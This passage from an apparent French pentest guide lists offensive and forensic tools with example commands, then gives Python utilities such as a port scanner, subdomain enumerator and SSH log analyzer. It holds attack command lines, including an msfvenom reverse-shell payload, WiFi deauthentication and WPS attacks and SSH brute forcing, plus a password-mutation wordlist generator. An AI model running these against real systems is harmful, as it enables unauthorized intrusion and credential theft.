| `exploitdb` | Base de données d'exploits | `searchsploit apache 2.4` |
| `msfvenom` | Génération de payloads | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f elf` |
| `beef` | Exploitation de navigateurs | `beef-xss` |
| `setoolkit` | Social Engineering Toolkit | `setoolkit` |
| `empire` | Post-exploitation PowerShell | `powershell-empire` |
| `covenant` | C2 .NET | `covenant` |

### 11.5 Tests sans fil (WiFi)

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `aircrack-ng` | Suite WiFi complète | `aircrack-ng capture.cap -w wordlist.txt` |
| `airmon-ng` | Mode monitor | `airmon-ng start wlan0` |
| `airodump-ng` | Capture de paquets WiFi | `airodump-ng wlan0mon` |
| `aireplay-ng` | Injection de paquets | `aireplay-ng -0 10 -a BSSID wlan0mon` |
| `wifite` | Automatisation WiFi | `wifite` |
| `reaver` | Attaque WPS | `reaver -i wlan0mon -b BSSID -vv` |
| `bully` | Attaque WPS alternative | `bully -b BSSID wlan0mon` |
| `kismet` | Détection et sniffer WiFi | `kismet` |
| `bettercap` | Framework d'attaque réseau | `bettercap -iface wlan0` |
| `hcxdumptool` | Capture PMKID | `hcxdumptool -i wlan0mon -o capture.pcapng` |
| `hcxpcapngtool` | Conversion pour hashcat | `hcxpcapngtool -o hash.hc22000 capture.pcapng` |
| `hashcat` | Craquage de mots de passe GPU | `hashcat -m 22000 hash.hc22000 wordlist.txt` |
| `john` | Craquage de mots de passe CPU | `john --wordlist=wordlist.txt hash.txt` |

### 11.6 Forensics et investigation

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `autopsy` | Interface graphique forensics | `autopsy` |
| `sleuthkit` | Outils forensics en ligne de commande | `fls -r /dev/sda1` |
| `volatility3` | Analyse de mémoire RAM | `vol -f dump.raw windows.info` |
| `binwalk` | Analyse et extraction de firmware | `binwalk -e firmware.bin` |
| `foremost` | Récupération de fichiers | `foremost -i image.dd` |
| `scalpel` | Récupération de fichiers avancée | `scalpel image.dd` |
| `photorec` | Récupération de fichiers | `photorec` |
| `testdisk` | Récupération de partitions | `testdisk` |
| `bulk_extractor` | Extraction rapide de données | `bulk_extractor -o out image.dd` |
| `strings` | Extraire les chaînes imprimables | `strings fichier` |
| `exiftool` | Lecture de métadonnées | `exiftool image.jpg` |
| `pdf-parser` | Analyse de PDF | `pdf-parser.py fichier.pdf` |
| `oledump` | Analyse de documents OLE | `oledump.py fichier.doc` |

### 11.7 Reverse engineering

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `ghidra` | Framework de reverse engineering NSA | `ghidra` |
| `radare2` | Framework RE en ligne de commande | `r2 -A binaire` |
| `cutter` | Interface graphique radare2 | `cutter` |
| `gdb` | Débogueur GNU | `gdb ./binaire` |
| `pwndbg` | Plugins GDB pour l'exploitation | `gdb-pwndbg ./binaire` |
| `peda` | Plugins GDB Python | `gdb-peda ./binaire` |
| `strace` | Trace des appels système | `strace ./binaire` |
| `ltrace` | Trace des appels de bibliothèque | `ltrace ./binaire` |
| `objdump` | Désassemblage | `objdump -d binaire` |
| `readelf` | Analyse ELF | `readelf -a binaire` |
| `checksec` | Vérifier les protections binaire | `checksec --file=./binaire` |
| `upx` | Packers/dépackers | `upx -d binaire` |
| `yara` | Classification de malwares | `yara rules.yar fichier` |

### 11.8 Steganographie et cryptographie

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `steghide` | Cacher des données dans images/audio | `steghide embed -cf image.jpg -ef secret.txt` |
| `stegseek` | Brute-force steghide | `stegseek image.jpg wordlist.txt` |
| `zsteg` | Stegano PNG/BMP | `zsteg image.png` |
| `steghide-extractor` | Extraction steghide | `steghide extract -sf image.jpg` |
| `openstego` | Outil de stéganographie | `openstego` |
| `outguess` | Steganographie | `outguess -k password -d secret.txt image.jpg out.jpg` |
| `sonic-visualiser` | Analyse audio visuelle | `sonic-visualiser` |
| `openssl` | Outils cryptographiques | `openssl enc -aes-256-cbc -in f.txt -out f.enc` |
| `gpg` | Chiffrement et signatures | `gpg --encrypt --recipient alice fichier` |
| `hashcat` | Craquage de hachés | `hashcat -m 0 hash.txt wordlist.txt` |
| `john` | John the Ripper | `john hash.txt` |
| `hydra` | Brute-force en ligne | `hydra -l admin -P wordlist.txt ssh://cible` |
| `medusa` | Brute-force rapide | `medusa -h cible -u admin -P wordlist -M ssh` |

---

## 12. Scripts Python avancés

### 12.1 Script 1 : Scanner de ports asynchrone

```python
#!/usr/bin/env python3
"""
scanner_ports.py
Auteur : hackerstchad
Version : 2026-2027
Description : Scanner de ports TCP asynchrone rapide.
"""

import asyncio
import sys
from datetime import datetime


async def probe_port(host: str, port: int, timeout: float = 1.5) -> tuple[int, bool]:
    """
    Tente une connexion TCP sur un port donné.
    Retourne (port, etat_ouvert).
    """
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return port, True
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return port, False


async def scan_ports(host: str, ports: list[int], concurrency: int = 200) -> list[int]:
    """
    Scanne une liste de ports avec une limite de concurrence.
    """
    semaphore = asyncio.Semaphore(concurrency)
    open_ports: list[int] = []

    async def bounded_probe(port: int) -> None:
        async with semaphore:
            port_number, is_open = await probe_port(host, port)
            if is_open:
                open_ports.append(port_number)
                print(f"[+] Port ouvert : {port_number}")

    await asyncio.gather(*(bounded_probe(p) for p in ports))
    return sorted(open_ports)


def parse_ports(port_arg: str) -> list[int]:
    """
    Convertit une chaîne comme '1-1000,8080,8443' en liste d'entiers.
    """
    ports: set[int] = set()
    for chunk in port_arg.split(','):
        chunk = chunk.strip()
        if '-' in chunk:
            start, end = chunk.split('-', 1)
            ports.update(range(int(start), int(end) + 1))
        else:
            ports.add(int(chunk))
    return sorted(ports)


def main() -> None:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <hote> <ports> [concurrency]")
        print(f"Exemple: {sys.argv[0]} 192.168.1.1 1-65535 500")
        sys.exit(1)

    host = sys.argv[1]
    ports = parse_ports(sys.argv[2])
    concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 200

    print(f"[*] Scan de {host} sur {len(ports)} ports (concurrence={concurrency})")
    print(f"[*] Début : {datetime.now().isoformat()}")

    open_ports = asyncio.run(scan_ports(host, ports, concurrency))

    print(f"[*] Fin : {datetime.now().isoformat()}")
    print(f"[*] Ports ouverts ({len(open_ports)}) : {open_ports}")


if __name__ == "__main__":
    main()
```

### 12.2 Script 2 : Énumération de sous-domaines

```python
#!/usr/bin/env python3
"""
subdomain_enum.py
Auteur : hackerstchad
Version : 2026-2027
Description : Énumération de sous-domaines par wordlist et résolution DNS.
"""

import asyncio
import sys
import aiodns
from typing import Optional


async def resolve_subdomain(
    resolver: aiodns.DNSResolver, domain: str, subdomain: str
) -> Optional[str]:
    """
    Résout un sous-domaine et retourne la première IP trouvée.
    """
    full = f"{subdomain}.{domain}"
    try:
        result = await resolver.query(full, "A")
        if result:
            ip = result[0].host
            print(f"[+] {full} -> {ip}")
            return full
    except aiodns.error.DNSError:
        pass
    return None


async def enumerate_subdomains(
    domain: str, wordlist_path: str, concurrency: int = 100
) -> list[str]:
    """
    Énumère les sous-domaines à partir d'une wordlist.
    """
    resolver = aiodns.DNSResolver()
    semaphore = asyncio.Semaphore(concurrency)
    found: list[str] = []

    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        subdomains = [line.strip() for line in f if line.strip()]

    async def bounded_check(sub: str) -> None:
        async with semaphore:
            result = await resolve_subdomain(resolver, domain, sub)
            if result:
                found.append(result)

    await asyncio.gather(*(bounded_check(sub) for sub in subdomains))
    return found


def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <domaine> <wordlist>")
        sys.exit(1)

    domain = sys.argv[1]
    wordlist = sys.argv[2]

    print(f"[*] Énumération des sous-domaines de {domain}")
    found = asyncio.run(enumerate_subdomains(domain, wordlist))
    print(f"[*] Trouvés : {len(found)}")
    for sub in found:
        print(sub)


if __name__ == "__main__":
    main()
```

### 12.3 Script 3 : Analyseur de logs SSH

```python
#!/usr/bin/env python3
"""
ssh_log_analyzer.py
Auteur : hackerstchad
Version : 2026-2027
Description : Analyse les logs SSH pour détecter les tentatives de connexion.
"""

import re
import sys
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path


class SSHLogAnalyzer:
    """
    Analyseur de journaux SSH pour identifier les attaques par brute-force.
    """

    # Jan 10 09:23:45 serveur sshd[1234]: Failed password for invalid user admin from 192.168.1.50 port 54321 ssh2
    FAILED_PATTERN = re.compile(
        r"^(?P<timestamp>\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+\S+\s+sshd\[\d+\]:\s+"
        r"Failed password for(?: invalid user)?\s+(?P<user>\S+)\s+from\s+(?P<ip>\S+)\s+port\s+(?P<port>\d+)"
    )

    ACCEPTED_PATTERN = re.compile(
        r"^(?P<timestamp>\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+\S+\s+sshd\[\d+\]:\s+"
        r"Accepted password for\s+(?P<user>\S+)\s+from\s+(?P<ip>\S+)"
    )

    def __init__(self, log_path: str):
        self.log_path = Path(log_path)
        self.failed_attempts: list[dict] = []
        self.accepted_attempts: list[dict] = []

    def parse(self) -> None:
        """
        Parcourt le fichier de log et extrait les événements.
        """
        if not self.log_path.exists():
            print(f"[!] Fichier introuvable : {self.log_path}")
            sys.exit(1)

        with self.log_path.open(encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.rstrip("\n")
                failed = self.FAILED_PATTERN.search(line)
                if failed:
                    self.failed_attempts.append(failed.groupdict())
                    continue
                accepted = self.ACCEPTED_PATTERN.search(line)
                if accepted:
                    self.accepted_attempts.append(accepted.groupdict())

    def report(self) -> None:
        """
        Affiche un rapport synthétique.
        """
        print("=" * 70)
        print("RAPPORT D'ANALYSE SSH")
        print("=" * 70)
        print(f"Fichier analysé : {self.log_path}")
        print(f"Date d'analyse  : {datetime.now().isoformat()}")
        print(f"Échecs totaux   : {len(self.failed_attempts)}")
        print(f"Succès totaux   : {len(self.accepted_attempts)}")

        if self.failed_attempts:
            ip_counter = Counter(a["ip"] for a in self.failed_attempts)
            user_counter = Counter(a["user"] for a in self.failed_attempts)

            print("\n--- Top 10 adresses IP par nombre d'échecs ---")
            for ip, count in ip_counter.most_common(10):
                print(f"  {ip:<20} {count:>6} tentatives")

            print("\n--- Top 10 noms d'utilisateur testés ---")
            for user, count in user_counter.most_common(10):
                print(f"  {user:<20} {count:>6} fois")

            attempts_by_ip = defaultdict(list)
            for attempt in self.failed_attempts:
                attempts_by_ip[attempt["ip"]].append(attempt["user"])

            print("\n--- Détails par IP suspecte ---")
            for ip, users in attempts_by_ip.items():
                unique_users = set(users)
                if len(users) >= 5:
                    print(f"  {ip} : {len(users)} échecs, utilisateurs : {unique_users}")


def main() -> None:
    log_file = sys.argv[1] if len(sys.argv) > 1 else "/var/log/auth.log"
    analyzer = SSHLogAnalyzer(log_file)
    analyzer.parse()
    analyzer.report()


if __name__ == "__main__":
    main()
```

### 12.4 Script 4 : Extracteur de métadonnées en masse

```python
#!/usr/bin/env python3
"""
metadata_extractor.py
Auteur : hackerstchad
Version : 2026-2027
Description : Extrait les métadonnées EXIF de fichiers images en masse.
"""

import json
import sys
from pathlib import Path

try:
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS
except ImportError as exc:
    raise SystemExit("Installez Pillow : pip install Pillow") from exc


def convert_gps_coords(coords: tuple, ref: str) -> float:
    """
    Convertit les coordonnées GPS EXIF en degrés décimaux.
    """
    degrees, minutes, seconds = coords
    decimal = degrees + minutes / 60 + seconds / 3600
    if ref in ("S", "W"):
        decimal = -decimal
    return float(decimal)


def extract_exif(image_path: Path) -> dict:
    """
    Extrait les métadonnées EXIF d'une image.
    """
    result: dict = {"fichier": str(image_path), "gps": None, "exif": {}}
    try:
        with Image.open(image_path) as img:
            exif = img._getexif()
            if not exif:
                return result

            gps_info = {}
            for tag_id, value in exif.items():
                tag = TAGS.get(tag_id, tag_id)
                if tag == "GPSInfo":
                    gps_info = {GPSTAGS.get(k, k): v for k, v in value.items()}
                else:
                    result["exif"][tag] = str(value)

            if "GPSLatitude" in gps_info and "GPSLongitude" in gps_info:
                lat = convert_gps_coords(
                    gps_info["GPSLatitude"], gps_info.get("GPSLatitudeRef", "N")
                )
                lon = convert_gps_coords(
                    gps_info["GPSLongitude"], gps_info.get("GPSLongitudeRef", "E")
                )
                result["gps"] = {"latitude": lat, "longitude": lon}
    except Exception as exc:
        result["erreur"] = str(exc)
    return result


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <dossier_ou_fichier>")
        sys.exit(1)

    target = Path(sys.argv[1])
    images: list[Path] = []

    if target.is_file():
        images = [target]
    elif target.is_dir():
        images = list(target.rglob("*.jpg")) + list(target.rglob("*.jpeg")) + list(target.rglob("*.png"))
    else:
        print("[!] Cible invalide")
        sys.exit(1)

    results = [extract_exif(img) for img in images]
    print(json.dumps(results, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

### 12.5 Script 5 : Détection d'URLs mortes

```python
#!/usr/bin/env python3
"""
url_checker.py
Auteur : hackerstchad
Version : 2026-2027
Description : Vérifie l'état HTTP d'une liste d'URLs.
"""

import asyncio
import sys
from urllib.parse import urlparse

import aiohttp


async def check_url(
    session: aiohttp.ClientSession, url: str, timeout: int = 10
) -> dict:
    """
    Envoie une requête HEAD et retourne le statut HTTP.
    """
    result = {"url": url, "status": None, "error": None}
    try:
        async with session.head(url, timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=True) as resp:
            result["status"] = resp.status
            result["final_url"] = str(resp.url)
    except aiohttp.ClientError as exc:
        result["error"] = type(exc).__name__
    except asyncio.TimeoutError:
        result["error"] = "TIMEOUT"
    return result


async def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier_urls> [concurrency]")
        sys.exit(1)

    url_file = sys.argv[1]
    concurrency = int(sys.argv[2]) if len(sys.argv) > 2 else 50

    with open(url_file, encoding="utf-8", errors="ignore") as f:
        urls = [line.strip() for line in f if line.strip()]

    semaphore = asyncio.Semaphore(concurrency)

    async with aiohttp.ClientSession() as session:

        async def bounded_check(url: str) -> dict:
            async with semaphore:
                return await check_url(session, url)

        results = await asyncio.gather(*(bounded_check(u) for u in urls))

    for r in results:
        if r["status"] and 200 <= r["status"] < 400:
            print(f"[OK] {r['url']} -> {r['status']}")
        elif r["status"]:
            print(f"[WARN] {r['url']} -> {r['status']}")
        else:
            print(f"[ERR] {r['url']} -> {r['error']}")


if __name__ == "__main__":
    asyncio.run(main())
```

### 12.6 Script 6 : Générateur de wordlist personnalisé

```python
#!/usr/bin/env python3
"""
wordlist_generator.py
Auteur : hackerstchad
Version : 2026-2027
Description : Génère une wordlist à partir de mots-clés et transformations.
"""

import itertools
import sys
from pathlib import Path


class WordlistGenerator:
    """
    Génère des variantes de mots de passe à partir de mots-clés.
    """

    COMMON_SUFFIXES = [
        "", "1", "12", "123", "1234", "12345", "123456",
        "!", "@", "#", "2025", "2026", "2027",
        "01", "02", "03", "04", "05", "06", "07", "08", "09", "10",
        "!@#", "qwerty", "admin", "root", "pass", "pwd"
    ]

    LEET_MAP = {
        "a": ["a", "4", "@"],
        "e": ["e", "3"],
        "i": ["i", "1", "!"],
        "o": ["o", "0"],
        "s": ["s", "5", "$"],
        "t": ["t", "7", "+"],
        "l": ["l", "1"],
        "g": ["g", "9"],
        "b": ["b", "8"],
    }

    def __init__(self, keywords: list[str]):
        self.keywords = keywords

    @staticmethod
    def transform_case(word: str) -> list[str]:
        """
        Génère les variantes de casse.
        """
        return list({word.lower(), word.upper(), word.capitalize(), word.title()})

    def transform_leet(self, word: str) -> list[str]:
        """
        Génère les variantes leet speak.
        """
        variants = [""]
        for char in word.lower():
            replacements = self.LEET_MAP.get(char, [char])
            variants = [v + r for v in variants for r in replacements]
        return variants

    def generate(self) -> set[str]:
        """
        Génère toutes les combinaisons.
        """
        results: set[str] = set()
        for keyword in self.keywords:
            base_words = self.transform_case(keyword)
            base_words += self.transform_leet(keyword)
            for word in base_words:
                for suffix in self.COMMON_SUFFIXES:
                    results.add(word + suffix)
                    results.add(suffix + word)
        return results


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mot1> [mot2] [mot3] ...")
        sys.exit(1)

    generator = WordlistGenerator(sys.argv[1:])
    words = generator.generate()

    output = Path("wordlist_generated.txt")
    output.write_text("\n".join(sorted(words)) + "\n", encoding="utf-8")
    print(f"[*] {len(words)} mots générés dans {output}")


if __name__ == "__main__":
    main()
```

### 12.7 Script 7 : Parseur de certificats TLS

```python
#!/usr/bin/env python3
"""
tls_certificate_parser.py
Auteur : hackerstchad
Version : 2026-2027
Description : Récupère et affiche les informations d'un certificat TLS.
"""

import json
import ssl
import sys
from datetime import datetime
from socket import create_connection


def get_certificate_info(hostname: str, port: int = 443) -> dict:
    """
    Se connecte à un hôte et extrait les informations du certificat TLS.
    """
    context = ssl.create_default_context()
    with create_connection((hostname, port), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()
            cipher = ssock.cipher()
            version = ssock.version()

    result = {
        "hote": hostname,
        "port": port,
        "version_tls": version,
        "sujet": cert.get("subject"),
        "emis_pour": cert.get("subjectAltName"),
        "émetteur": cert.get("issuer"),
        "valide_depuis": cert.get("notBefore"),
        "valide_jusqu_a": cert.get("notAfter"),
        "nombre_jours_restants": None,
        "cipher": cipher[0],
    }

    if cert.get("notAfter"):
        expiry = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
        result["nombre_jours_restants"] = (expiry - datetime.utcnow()).days

    return result


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <hote> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443

    try:
        info = get_certificate_info(host, port)
        print(json.dumps(info, indent=2, ensure_ascii=False))
    except Exception as exc:
        print(f"[!] Erreur : {exc}")


if __name__ == "__main__":
    main()
```

### 12.8 Script 8 : Moniteur de fichiers sensibles

```python
#!/usr/bin/env python3
"""
sensitive_file_monitor.py
Auteur : hackerstchad
Version : 2026-2027
Description : Surveille la création ou modification de fichiers sensibles.
"""

import sys
import time
from pathlib import Path


def get_files(path: Path, patterns: list[str]) -> dict[Path, float]:
    """
    Retourne un dictionnaire {fichier: mtime} correspondant aux patterns.
    """
    files: dict[Path, float] = {}
    for pattern in patterns:
        for f in path.rglob(pattern):
            if f.is_file():
                files[f] = f.stat().st_mtime
    return files


def monitor(path: Path, patterns: list[str], interval: int = 5) -> None:
    """
    Boucle de surveillance infinie.
    """
    print(f"[*] Surveillance de {path} avec {patterns}")
    previous = get_files(path, patterns)

    try:
        while True:
            time.sleep(interval)
            current = get_files(path, patterns)

            new_files = current.keys() - previous.keys()
            removed_files = previous.keys() - current.keys()
            modified_files = {
                f for f in current if f in previous and current[f] != previous[f]
            }

            for f in new_files:
                print(f"[+] Nouveau fichier : {f}")
            for f in removed_files:
                print(f"[-] Fichier supprimé : {f}")
            for f in modified_files:
                print(f"[!] Fichier modifié : {f}")

            previous = current
    except KeyboardInterrupt:
        print("\n[*] Surveillance arrêtée")


def main() -> None:
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(".")
    patterns = sys.argv[2:] if len(sys.argv) > 2 else ["*.key", "*.pem", "*.env", "*.htpasswd", "id_rsa"]
    monitor(target, patterns)


if __name__ == "__main__":
    main()
```

### 12.9 Script 9 : Convertisseur de wordlists pour Hashcat

```python
#!/usr/bin/env python3
"""
hashcat_wordlist_processor.py
Auteur : hackerstchad
Version : 2026-2027
Description : Nettoie et optimise une wordlist pour Hashcat.
"""

import sys
from pathlib import Path


def process_wordlist(input_path: Path, output_path: Path, min_len: int = 1, max_len: int = 64) -> int:
    """
    Nettoie une wordlist : suppression des doublons, lignes vides,
    et limitation de longueur.
    """
    seen: set[str] = set()
    count = 0

    with input_path.open(encoding="utf-8", errors="ignore") as src, \
         output_path.open("w", encoding="utf-8") as dst:
        for line in src:
            word = line.rstrip("\r\n")
            if not word:
                continue
            if not (min_len <= len(word) <= max_len):
                continue
            if word in seen:
                continue
            seen.add(word)
            dst.write(word + "\n")
            count += 1

    return count


def main() -> None:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input> <output> [min_len] [max_len]")
        sys.exit(1)

    input_file = Path(sys.argv[1])
    output_file = Path(sys.argv[2])
    min_len = int(sys.argv[3]) if len(sys.argv) > 3 else 1
    max_len = int(sys.argv[4]) if len(sys.argv) > 4 else 64

    total = process_wordlist(input_file, output_file, min_len, max_len)
    print(f"[*] {total} mots uniques écrits dans {output_file}")


if __name__ == "__main__":
    main()
```

### 12.10 Script 10 : Client de requêtes HTTP rapide

```python
#!/usr/bin/env python3
"""
http_request_cli.py
Auteur : hackerstchad
Version : 2026-2027
Description : Envoie des requêtes HTTP avec en-têtes personnalisables.
"""

import argparse
import json

import requests


def build_headers(raw_headers: list[str]) -> dict[str, str]:
    """
    Convertit une liste "Clé: Valeur" en dictionnaire.
    """
    headers: dict[str, str] = {}
    for h in raw_headers:
        if ":" not in h:
            continue
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()
    return headers


def main() -> None:
    parser = argparse.ArgumentParser(description="Client HTTP rapide")
    parser.add_argument("url", help="URL cible")
    parser.add_argument("-X", "--method", default="GET", help="Méthode HTTP")
    parser.add_argument("-H", "--header", action="append", default=[], help="En-tête HTTP")
    parser.add_argument("-d", "--data", help="Corps de la requête")
    parser.add_argument("-o", "--output", help="Fichier de sortie")
    parser.add_argument("--json", action="store_true", help="Envoyer le corps en JSON")
    args = parser.parse_args()

    headers = build_headers(args.header)
    data = None

    if args.data:
        if args.json:
            headers.setdefault("Content-Type", "application/json")
            try:
                data = json.loads(args.data)
            except json.JSONDecodeError:
                data = args.data
        else:
            data = args.data

    response = requests.request(
        method=args.method.upper(),
        url=args.url,
        headers=headers,
        data=data,
        timeout=30,
        allow_redirects=True,
    )

    print(f"Status : {response.status_code}")
    print(f"URL finale : {response.url}")
    print("En-têtes de réponse :")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    print("\nCorps (premiers 2000 caractères) :")
    print(response.text[:2000])

    if args.output:
        with open(args.output, "wb") as f:
            f.write(response.content)
        print(f"\n[*] Réponse sauvegardée dans {args.output}")


if __name__ == "__main__":
    main()
```

### 12.11 Script 11 : Analyseur de hashes

```python
#!/usr/bin/env python3
"""
hash_identifier.py
Auteur : hackerstchad
Version : 2026-2027
Description : Identifie le format probable d'un hash.
"""

import argparse
import hashlib
import re
import sys


PATTERNS = [
    (r"^[a-f0-9]{32}$", "MD5 (hashcat -m 0)"),
    (r"^[a-f0-9]{40}$", "SHA-1 (hashcat -m 100)"),
    (r"^[a-f0-9]{64}$", "SHA-256 (hashcat -m 1400)"),
    (r"^[a-f0-9]{128}$", "SHA-512 (hashcat -m 1700)"),
    (r"^\$2[ayb]\$\d{2}\$[A-Za-z0-9./]{53}$", "bcrypt (hashcat -m 3200)"),
    (r"^\$6\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{86}$", "SHA-512 Crypt (hashcat -m 1800)"),
    (r"^\$1\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{22}$", "MD5 Crypt (hashcat -m 500)"),
    (r"^\$5\$[A-Za-z0-9./]+\$[A-Za-z0-9./]{43}$", "SHA-256 Crypt (hashcat -m 7400)"),
    (r"^sha1\$[a-z0-9]+\$[a-f0-9]{40}$", "Django SHA1"),
    (r"^pbkdf2_sha256\$\d+\$[A-Za-z0-9+/]+\$[A-Za-z0-9+/=]{44}$", "Django PBKDF2-SHA256"),
    (r"^0x0100[a-f0-9]{8}[a-f0-9]{40}[a-f0-9]{40}$", "MSSQL (2012+) (hashcat -m 1731)"),
    (r"^\$ml\$\d+\$[a-f0-9]{64}\$[a-f0-9]{128}$", "OSX v10.8+ (hashcat -m 7100)"),
]


def identify_hash(value: str) -> list[str]:
    """
    Retourne les formats probables pour un hash donné.
    """
    matches = []
    for pattern, name in PATTERNS:
        if re.match(pattern, value, re.IGNORECASE):
            matches.append(name)
    if not matches:
        matches.append("Format non reconnu")
    return matches


def compute_sample_hashes(text: str) -> dict[str, str]:
    """
    Calcule quelques hashes de référence pour comparaison.
    """
    encoded = text.encode("utf-8")
    return {
        "MD5": hashlib.md5(encoded).hexdigest(),
        "SHA-1": hashlib.sha1(encoded).hexdigest(),
        "SHA-256": hashlib.sha256(encoded).hexdigest(),
        "SHA-512": hashlib.sha512(encoded).hexdigest(),
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Identifie le type d'un hash")
    parser.add_argument("hash_value", help="Hash à identifier")
    parser.add_argument("--sample", "-s", help="Texte pour calculer des hashes de comparaison")
    args = parser.parse_args()

    candidates = identify_hash(args.hash_value)
    print(f"Hash : {args.hash_value}")
    print("Candidats identifiés :")
    for c in candidates:
        print(f"  - {c}")

    if args.sample:
        print("\nHashes de comparaison pour le texte fourni :")
        for algo, digest in compute_sample_hashes(args.sample).items():
            print(f"  {algo}: {digest}")


if __name__ == "__main__":
    main()
```

### 12.12 Script 12 : Générateur de rapports Markdown

```python
#!/usr/bin/env python3
"""
report_generator.py
Auteur : hackerstchad
Version : 2026-2027
Description : Génère un squelette de rapport de pentest au format Markdown.
"""

import json
import sys
from datetime import datetime
from pathlib import Path


TEMPLATE = """# Rapport de test d'intrusion

**Client :** {client}  
**Date :** {date}  
**Auteur :** {author}  
**Version :** {version}

---

## 1. Résumé exécutif

[Résumé des constatations principales]

## 2. Méthodologie

- Reconnaissance
- Scan et énumération
- Exploitation
- Post-exploitation
- Recommandations

## 3. Résultats détaillés

| # | Vulnérabilité | Sévérité | Preuve | Recommandation |
|---|---------------|----------|--------|----------------|
{finding_rows}

## 4. Annexe technique

### Outils utilisés
{tools_list}

### Commandes clés
```bash
{commands}
```

---
*Généré automatiquement par report_generator.py*
"""


def generate_report(data: dict) -> str:
    """
    Remplit le template avec les données fournies.
    """
    findings = data.get("findings", [])
    rows = []
    for i, f in enumerate(findings, 1):
        rows.append(
            f"| {i} | {f.get('title')} | {f.get('severity')} | {f.get('evidence')} | {f.get('recommendation')} |"
        )

    tools = data.get("tools", [])
    tools_list = "\n".join(f"- {tool}" for tool in tools)

    return TEMPLATE.format(
        client=data.get("client", "Non spécifié"),
        date=datetime.now().strftime("%Y-%m-%d"),
        author=data.get("author", "hackerstchad"),
        version=data.get("version", "2026-2027"),
        finding_rows="\n".join(rows) if rows else "| - | Aucune constatation | - | - | - |",
        tools_list=tools_list if tools_list else "- Non spécifié",
        commands=data.get("commands", "# À compléter"),
    )


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier_json>")
        sys.exit(1)

    json_path = Path(sys.argv[1])
    data = json.loads(json_path.read_text(encoding="utf-8"))
    report = generate_report(data)

    output = Path("rapport_pentest.md")
    output.write_text(report, encoding="utf-8")
    print(f"[*] Rapport généré : {output}")


if __name__ == "__main__":
    main()
```

### 12.13 Script 13 : Extracteur d'adresses IP depuis un texte

```python
#!/usr/bin/env python3
"""
ip_extractor.py
Auteur : hackerstchad
Version : 2026-2027
Description : Extrait les adresses IPv4/IPv6 et les CIDR d'un texte.
"""

import re
import sys
from pathlib import Path
from ipaddress import ip_address, ip_network, AddressValueError


IPV4_PATTERN = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b"
)
IPV4_CIDR_PATTERN = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)/(\d{1,2})\b"
)


def extract_ips(text: str) -> dict[str, set[str]]:
    """
    Extrait et valide les adresses IPv4 et les CIDR.
    """
    result: dict[str, set[str]] = {"ipv4": set(), "cidr": set(), "invalid": set()}

    for candidate in IPV4_CIDR_PATTERN.findall(text):
        # findall retourne les suffixes, reconstruire le CIDR complet
        pass

    for match in IPV4_CIDR_PATTERN.finditer(text):
        cidr = match.group(0)
        try:
            ip_network(cidr, strict=False)
            result["cidr"].add(cidr)
        except ValueError:
            result["invalid"].add(cidr)

    for match in IPV4_PATTERN.finditer(text):
        ip = match.group(0)
        # Éviter les doublons déjà dans un CIDR
        if any(ip in cidr for cidr in result["cidr"]):
            continue
        try:
            ip_address(ip)
            result["ipv4"].add(ip)
        except AddressValueError:
            result["invalid"].add(ip)

    return result


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier>")
        sys.exit(1)

    text = Path(sys.argv[1]).read_text(encoding="utf-8", errors="ignore")
    result = extract_ips(text)

    print("Adresses IPv4 :")
    for ip in sorted(result["ipv4"]):
        print(f"  {ip}")
    print("\nCIDR :")
    for cidr in sorted(result["cidr"]):
        print(f"  {cidr}")
    if result["invalid"]:
        print("\nEntrées invalides :")
        for inv in sorted(result["invalid"]):
            print(f"  {inv}")


if __name__ == "__main__":
    main()
```

### 12.14 Script 14 : Vérificateur de fuites de mots de passe

```python
#!/usr/bin/env python3
"""
pwned_password_checker.py
Auteur : hackerstchad
Version : 2026-2027
Description : Vérifie si un mot de passe est présent dans Have I Been Pwned.
"""

import hashlib
import sys

import requests


def check_password(password: str) -> tuple[bool, int]:
    """
    Interroge l'API k-anonymity de HIBP.
    """
